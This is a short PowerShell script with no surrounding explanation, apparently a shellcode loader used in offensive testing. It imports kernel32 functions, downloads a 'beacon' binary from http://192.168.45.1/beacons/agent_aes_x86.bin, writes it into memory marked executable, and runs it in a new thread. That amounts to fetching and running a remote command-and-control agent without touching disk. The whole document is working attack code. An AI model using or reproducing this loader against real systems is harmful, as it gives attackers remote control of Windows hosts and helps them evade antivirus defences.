$PInvoke = @"
using System;
using System.Runtime.InteropServices;

public class PInvoke {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $PInvoke

[Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.1:80/beacons/agent_aes_x86.bin')
$size = $buf.Length
[IntPtr]$addr = [PInvoke]::VirtualAlloc(0, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$handle = [PInvoke]::CreateThread(0, 0, $addr, 0, 0, 0)
[PInvoke]::WaitForSingleObject($handle, [uint32]"0xFFFFFFFF")
